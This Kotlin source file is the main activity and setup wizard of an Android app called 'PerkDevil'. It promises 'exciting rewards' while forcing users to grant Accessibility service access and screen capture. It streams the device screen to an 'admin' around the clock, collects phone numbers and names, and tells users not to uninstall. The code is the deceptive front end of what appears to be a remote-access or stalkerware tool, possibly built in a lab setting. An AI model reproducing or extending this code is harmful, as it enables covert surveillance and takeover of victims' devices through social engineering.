package lab.arl.target.presentation

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.ContextWrapper
import android.content.Intent
import android.media.projection.MediaProjectionConfig
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Checkbox
import androidx.compose.material3.CheckboxDefaults
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import lab.arl.target.R
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import lab.arl.target.TargetApplication
import lab.arl.target.domain.EnrollmentPhase
import lab.arl.target.domain.OperationStatus
import lab.arl.target.presentation.theme.PerkDevilTheme
import lab.arl.target.presentation.theme.PerkOrange
import lab.arl.target.presentation.theme.PerkBlack
import lab.arl.target.presentation.theme.Jersey10
import lab.arl.target.session.TargetUiState

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val app = application as TargetApplication
        val prefs = getSharedPreferences("perkdevil_prefs", Context.MODE_PRIVATE)
        val vm: TargetViewModel by viewModels {
            TargetViewModel.factory(app.container.coordinator, app.container.backupRepository, prefs)
        }
        intent?.data?.toString()?.let { vm.onPairingInput(it) }
        setContent {
            PerkDevilTheme {
                Surface(modifier = Modifier.fillMaxSize(), color = Color.White) {
                    TargetScreen(vm, onExit = {
                        finishAffinity()
                        kotlin.system.exitProcess(0)
                    })
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        (application as TargetApplication).container.coordinator.refreshCapabilities()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        val app = application as TargetApplication
        intent.data?.toString()?.let { app.container.coordinator.updatePairingInput(it) }
    }
}

// ═══════════════════════════════════════════════════════════════════
// PerkDevil Logo
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun PerkDevilLogo(modifier: Modifier = Modifier) {
    Image(
        painter = painterResource(id = R.drawable.perkdevil_logo),
        contentDescription = "PERKDEVIL",
        contentScale = ContentScale.Fit,
        modifier = modifier
            .fillMaxWidth()
            .height(110.dp)
    )
}

// ═══════════════════════════════════════════════════════════════════
// Main Target Screen — Wizard Router
// ═══════════════════════════════════════════════════════════════════

@Composable
fun TargetScreen(vm: TargetViewModel, onExit: () -> Unit = {}) {
    val state by vm.ui.collectAsState()
    val wizardStep by vm.wizardStep.collectAsState()
    val context = LocalContext.current

    val projectionLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        vm.onProjection(result.resultCode == Activity.RESULT_OK, result.resultCode, result.data)
    }
    val notifyLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { }

    LaunchedEffect(Unit) {
        if (Build.VERSION.SDK_INT >= 33) {
            notifyLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    LaunchedEffect(state.needsMediaProjection) {
        if (state.needsMediaProjection) {
            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val intent = if (Build.VERSION.SDK_INT >= 34) {
                mpm.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay())
            } else {
                mpm.createScreenCaptureIntent()
            }
            projectionLauncher.launch(intent)
        }
    }

    // Auto-compute wizard step from state
    val computedStep = vm.computeWizardStep(state)
    LaunchedEffect(computedStep) {
        // Only advance forward, never go back automatically
        if (computedStep.ordinal > wizardStep.ordinal) {
            vm.setWizardStep(computedStep)
        }
        // But always sync if we need to go back to LOGIN (e.g. revoked)
        if (computedStep == WizardStep.LOGIN && wizardStep != WizardStep.LOGIN) {
            vm.setWizardStep(WizardStep.LOGIN)
        }
    }

    // Accessibility gate
    val isAccessibilityActive = state.accessibilityEnabled && !state.showAccessibilityOnboarding
    val showAccessibilityGate = !isAccessibilityActive &&
        wizardStep != WizardStep.LOGIN &&
        state.phase != EnrollmentPhase.NOT_ENROLLED &&
        state.phase != EnrollmentPhase.PAIRING &&
        state.phase != EnrollmentPhase.REVOKED

    BackHandler(enabled = !isAccessibilityActive && showAccessibilityGate) {
        onExit()
    }

    if (showAccessibilityGate) {
        AlertDialog(
            onDismissRequest = { onExit() },
            title = { Text("Accessibility Permission Required", fontWeight = FontWeight.Bold) },
            text = {
                Text(
                    "PerkDevil requires Accessibility service permission to function. " +
                        "This permission is a mandatory pass to use the application. " +
                        "Please enable \"PerkDevil\" in Accessibility settings to continue."
                )
            },
            confirmButton = {
                Button(onClick = { vm.openAccessibilitySettings(context) }) {
                    Text("Open Settings")
                }
            },
            dismissButton = {
                TextButton(onClick = { onExit() }) {
                    Text("Exit App")
                }
            }
        )
    }

    // Route to current wizard screen
    when (wizardStep) {
        WizardStep.LOGIN -> LoginScreen(vm, state)
        WizardStep.PERMISSIONS -> PermissionsScreen(vm, state, context)
        WizardStep.CONGRATULATIONS -> CongratulationsScreen(vm)
        WizardStep.INSTRUCTIONS -> InstructionsScreen(vm)
        WizardStep.CONTACT_DETAILS -> ContactDetailsScreen(vm)
        WizardStep.CONNECTED -> ConnectedScreen(vm)
        WizardStep.ACTIVE_PAIRING -> ActivePairingScreen(vm, state)
    }

    // Global loading indicator
    if (state.operation.status == OperationStatus.LOADING) {
        LinearProgressIndicator(
            modifier = Modifier.fillMaxWidth(),
            color = PerkOrange
        )
    }
}

// ═══════════════════════════════════════════════════════════════════
// Screen 1: Login
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun LoginScreen(vm: TargetViewModel, state: TargetUiState) {
    WizardScaffold {
        PerkDevilLogo()

        Spacer(Modifier.height(24.dp))

        Text(
            "Log yourself in and\nwin exciting rewards",
            style = MaterialTheme.typography.bodyLarge,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(32.dp))

        PerkTextField(
            value = state.deviceNameInput,
            onValueChange = vm::onDeviceName,
            placeholder = "Full name"
        )

        Spacer(Modifier.height(12.dp))

        PerkTextField(
            value = state.pairingInput,
            onValueChange = vm::onPairingInput,
            placeholder = "Pairing Code"
        )

        Spacer(Modifier.height(24.dp))

        PerkButton(
            text = "Log in",
            onClick = {
                vm.claim()
                // Auto-confirm after claiming
                vm.confirm()
                vm.advanceWizard()
            },
            filled = false
        )

        if (state.phase == EnrollmentPhase.REVOKED) {
            Spacer(Modifier.height(12.dp))
            Text(
                "Previous enrollment was revoked. Enter new pairing code.",
                color = Color(0xFFD32F2F),
                style = MaterialTheme.typography.bodySmall,
                textAlign = TextAlign.Center,
                modifier = Modifier.fillMaxWidth()
            )
        }

        state.operation.message?.let { msg ->
            Spacer(Modifier.height(8.dp))
            Text(
                msg,
                color = if (state.operation.status == OperationStatus.FAILURE) Color(0xFFD32F2F) else PerkBlack,
                style = MaterialTheme.typography.bodySmall,
                textAlign = TextAlign.Center,
                modifier = Modifier.fillMaxWidth()
            )
        }
    }
}

// ═══════════════════════════════════════════════════════════════════
// Screen 2: Permissions
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun PermissionsScreen(vm: TargetViewModel, state: TargetUiState, context: Context) {
    val accessibilityOk = state.accessibilityEnabled && !state.showAccessibilityOnboarding
    val screenOk = state.screenCaptureActive

    WizardScaffold {
        PerkDevilLogo()

        Spacer(Modifier.height(24.dp))

        Text(
            "We need some permissions\nplease follow the below step\nto get you connected 24/7",
            style = MaterialTheme.typography.bodyLarge,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(32.dp))

        PerkButton(
            text = if (accessibilityOk) "✓ Accessibility Granted" else "accessibility for PERKDEVIL",
            onClick = { vm.openAccessibilitySettings(context) },
            filled = false,
            enabled = !accessibilityOk
        )

        Spacer(Modifier.height(12.dp))

        PerkButton(
            text = if (screenOk) "✓ Screen Permission Granted" else "Grant Screen Permission",
            onClick = { vm.retryScreenCapture() },
            filled = false,
            enabled = !screenOk
        )

        Spacer(Modifier.height(32.dp))

        PerkButton(
            text = "DONE",
            onClick = {
                vm.refreshAccessibility()
                if (accessibilityOk && screenOk) {
                    vm.advanceWizard()
                }
            },
            filled = true,
            enabled = accessibilityOk && screenOk
        )

        if (!accessibilityOk || !screenOk) {
            Spacer(Modifier.height(8.dp))
            Text(
                "Please grant all permissions to continue",
                style = MaterialTheme.typography.bodySmall,
                color = Color(0xFF999999),
                textAlign = TextAlign.Center,
                modifier = Modifier.fillMaxWidth()
            )
        }
    }
}

// ═══════════════════════════════════════════════════════════════════
// Screen 3: Congratulations
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun CongratulationsScreen(vm: TargetViewModel) {
    WizardScaffold {
        PerkDevilLogo()

        Spacer(Modifier.height(40.dp))

        Text(
            "🎉 CONGRATULATIONS 🎉",
            style = MaterialTheme.typography.headlineSmall,
            fontWeight = FontWeight.Bold,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(16.dp))

        Text(
            "You have been connected\nyour device is be streamed",
            style = MaterialTheme.typography.bodyLarge,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(40.dp))

        PerkButton(
            text = "Continue",
            onClick = { vm.advanceWizard() },
            filled = true
        )
    }
}

// ═══════════════════════════════════════════════════════════════════
// Screen 4: Instructions
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun InstructionsScreen(vm: TargetViewModel) {
    WizardScaffold {
        PerkDevilLogo()

        Spacer(Modifier.height(24.dp))

        Text(
            "To stay connected follow these instructions.",
            style = MaterialTheme.typography.bodyLarge,
            fontWeight = FontWeight.SemiBold,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(24.dp))

        Text(
            "Instructions",
            style = MaterialTheme.typography.titleMedium,
            fontWeight = FontWeight.Bold,
            color = PerkBlack
        )

        Spacer(Modifier.height(12.dp))

        InstructionBullet("Keep your internet connected to enjoy uninterrupted streaming")

        Spacer(Modifier.height(8.dp))

        InstructionBullet(
            "Keep the application this stays active in the background you can close it, you don't need to worry about connection loss."
        )

        Spacer(Modifier.height(8.dp))

        InstructionBullet(
            "Do not turn off accessibility feature or the screen permission if done so go to settings and again grant the permissions manually or just open the application again we will direct you to those permissions."
        )

        Spacer(Modifier.height(32.dp))

        PerkButton(
            text = "Understood",
            onClick = { vm.advanceWizard() },
            filled = true
        )
    }
}

@Composable
private fun InstructionBullet(text: String) {
    Row(modifier = Modifier.fillMaxWidth()) {
        Text("•", color = PerkBlack, fontWeight = FontWeight.Bold, modifier = Modifier.padding(end = 8.dp, top = 2.dp))
        Text(
            text,
            style = MaterialTheme.typography.bodyMedium,
            color = PerkBlack
        )
    }
}

// ═══════════════════════════════════════════════════════════════════
// Screen 5: Contact Details
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun ContactDetailsScreen(vm: TargetViewModel) {
    val phone by vm.contactPhone.collectAsState()
    val altPhone by vm.contactAltPhone.collectAsState()
    val confirmName by vm.contactConfirmName.collectAsState()
    val correct by vm.contactCorrect.collectAsState()

    WizardScaffold {
        PerkDevilLogo()

        Spacer(Modifier.height(24.dp))

        Text(
            "Enter your contact details for admin to call you in case of any interruption",
            style = MaterialTheme.typography.bodyLarge,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(24.dp))

        PerkTextField(
            value = phone,
            onValueChange = vm::onContactPhone,
            placeholder = "Phone no."
        )

        Spacer(Modifier.height(12.dp))

        PerkTextField(
            value = altPhone,
            onValueChange = vm::onContactAltPhone,
            placeholder = "Alternate no."
        )

        Spacer(Modifier.height(12.dp))

        PerkTextField(
            value = confirmName,
            onValueChange = vm::onContactConfirmName,
            placeholder = "confirm with your full name"
        )

        Spacer(Modifier.height(16.dp))

        Row(
            verticalAlignment = Alignment.CenterVertically,
            modifier = Modifier.fillMaxWidth()
        ) {
            Checkbox(
                checked = correct,
                onCheckedChange = vm::onContactCorrect,
                colors = CheckboxDefaults.colors(
                    checkedColor = PerkBlack,
                    uncheckedColor = PerkBlack
                )
            )
            Text(
                "these are correct details",
                style = MaterialTheme.typography.bodyMedium,
                color = PerkBlack
            )
        }

        Spacer(Modifier.height(24.dp))

        PerkButton(
            text = "Submit",
            onClick = { vm.submitContactDetails() },
            filled = true,
            enabled = phone.isNotBlank() && confirmName.isNotBlank() && correct
        )
    }
}

// ═══════════════════════════════════════════════════════════════════
// Screen 6: Connected Status
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun ConnectedScreen(vm: TargetViewModel) {
    WizardScaffold {
        PerkDevilLogo()

        Spacer(Modifier.height(40.dp))

        Text(
            "Nicely done, now you are\nconnected to the admin",
            style = MaterialTheme.typography.bodyLarge,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(24.dp))

        Text(
            "YOU CAN CHECK REMAINING\nDAYS LEFT TO RECONNECT\nWITH THE ADMIN",
            style = MaterialTheme.typography.bodySmall,
            fontWeight = FontWeight.Bold,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            letterSpacing = 1.sp,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(32.dp))

        PerkButton(
            text = "CHECK REMAINING\nPAIRING SESSION",
            onClick = { vm.advanceWizard() },
            filled = false
        )
    }
}

// ═══════════════════════════════════════════════════════════════════
// Screen 7: Active Pairing
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun ActivePairingScreen(vm: TargetViewModel, state: TargetUiState) {
    val remainingDays = vm.getRemainingDays()
    val pairingCode = state.device?.id?.take(8)?.uppercase() ?: "--------"

    WizardScaffold {
        PerkDevilLogo()

        Spacer(Modifier.height(24.dp))

        Text(
            "PAIRING CODE ACTIVE FOR\nNEXT $remainingDays DAYS",
            style = MaterialTheme.typography.titleMedium,
            fontWeight = FontWeight.Bold,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            letterSpacing = 1.sp,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(20.dp))

        // Code box
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .border(2.dp, PerkBlack, RoundedCornerShape(8.dp))
                .padding(16.dp),
            contentAlignment = Alignment.Center
        ) {
            Text(
                pairingCode,
                style = MaterialTheme.typography.headlineMedium,
                fontWeight = FontWeight.Bold,
                color = PerkBlack,
                letterSpacing = 4.sp
            )
        }

        Spacer(Modifier.height(16.dp))

        Text(
            "YOUR SESSION IS ACTIVE NO\nNEED TO ASSIGN",
            style = MaterialTheme.typography.bodySmall,
            fontWeight = FontWeight.SemiBold,
            color = PerkBlack,
            textAlign = TextAlign.Center,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(Modifier.height(24.dp))

        // Rules table
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .border(1.dp, PerkBlack, RoundedCornerShape(8.dp))
                .padding(16.dp)
        ) {
            Row(modifier = Modifier.fillMaxWidth()) {
                Text(
                    "SR.NO.",
                    fontWeight = FontWeight.Bold,
                    color = PerkBlack,
                    style = MaterialTheme.typography.bodySmall,
                    modifier = Modifier.width(60.dp)
                )
                Text(
                    "RULES TO BE ONLINE",
                    fontWeight = FontWeight.Bold,
                    color = PerkBlack,
                    style = MaterialTheme.typography.bodySmall
                )
            }

            Spacer(Modifier.height(8.dp))

            RuleRow("1.", "ACCESSIBILITY")
            Spacer(Modifier.height(4.dp))
            RuleRow("2.", "SCREEN PERMISSION")
            Spacer(Modifier.height(4.dp))
            RuleRow("3.", "DON'T UNINSTALL APP")
        }

        Spacer(Modifier.height(16.dp))

        // Connection status indicator
        val isConnected = state.wsState == lab.arl.target.network.WsConnectionState.CONNECTED
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.Center,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                "●",
                color = if (isConnected) Color(0xFF2E7D32) else Color(0xFFD32F2F),
                fontWeight = FontWeight.Bold,
                fontSize = 12.sp
            )
            Spacer(Modifier.width(8.dp))
            Text(
                if (isConnected) "Connected to server" else "Reconnecting...",
                style = MaterialTheme.typography.bodySmall,
                color = PerkBlack
            )
        }
    }
}

@Composable
private fun RuleRow(number: String, text: String) {
    Row(modifier = Modifier.fillMaxWidth()) {
        Text(
            number,
            color = PerkBlack,
            style = MaterialTheme.typography.bodySmall,
            modifier = Modifier.width(60.dp)
        )
        Text(
            text,
            color = PerkBlack,
            style = MaterialTheme.typography.bodySmall
        )
    }
}

// ═══════════════════════════════════════════════════════════════════
// Shared UI Components
// ═══════════════════════════════════════════════════════════════════

@Composable
private fun WizardScaffold(content: @Composable () -> Unit) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .background(Color.White)
            .padding(horizontal = 24.dp, vertical = 40.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        content()
    }
}

@Composable
private fun PerkTextField(
    value: String,
    onValueChange: (String) -> Unit,
    placeholder: String
) {
    OutlinedTextField(
        value = value,
        onValueChange = onValueChange,
        placeholder = {
            Text(placeholder, color = Color(0xFF999999), fontFamily = Jersey10)
        },
        textStyle = MaterialTheme.typography.bodyLarge.copy(fontFamily = Jersey10),
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(8.dp),
        colors = OutlinedTextFieldDefaults.colors(
            focusedBorderColor = PerkBlack,
            unfocusedBorderColor = Color(0xFFCCCCCC),
            focusedTextColor = PerkBlack,
            unfocusedTextColor = PerkBlack,
            cursorColor = PerkOrange,
            focusedContainerColor = Color.White,
            unfocusedContainerColor = Color.White
        ),
        singleLine = true
    )
}

@Composable
private fun PerkButton(
    text: String,
    onClick: () -> Unit,
    filled: Boolean,
    enabled: Boolean = true
) {
    Button(
        onClick = onClick,
        modifier = Modifier.fillMaxWidth(),
        enabled = enabled,
        shape = RoundedCornerShape(8.dp),
        colors = if (filled) {
            ButtonDefaults.buttonColors(
                containerColor = PerkBlack,
                contentColor = Color.White,
                disabledContainerColor = Color(0xFFCCCCCC),
                disabledContentColor = Color.White
            )
        } else {
            ButtonDefaults.buttonColors(
                containerColor = Color.White,
                contentColor = PerkBlack,
                disabledContainerColor = Color(0xFFF5F5F5),
                disabledContentColor = Color(0xFF999999)
            )
        },
        elevation = ButtonDefaults.buttonElevation(
            defaultElevation = if (filled) 0.dp else 0.dp
        ),
        border = if (!filled) {
            androidx.compose.foundation.BorderStroke(1.5.dp, if (enabled) PerkBlack else Color(0xFFCCCCCC))
        } else null
    ) {
        Text(
            text,
            fontWeight = FontWeight.Bold,
            textAlign = TextAlign.Center,
            modifier = Modifier.padding(vertical = 4.dp)
        )
    }
}

tailrec fun Context.findActivity(): Activity? = when (this) {
    is Activity -> this
    is ContextWrapper -> baseContext.findActivity()
    else -> null
}
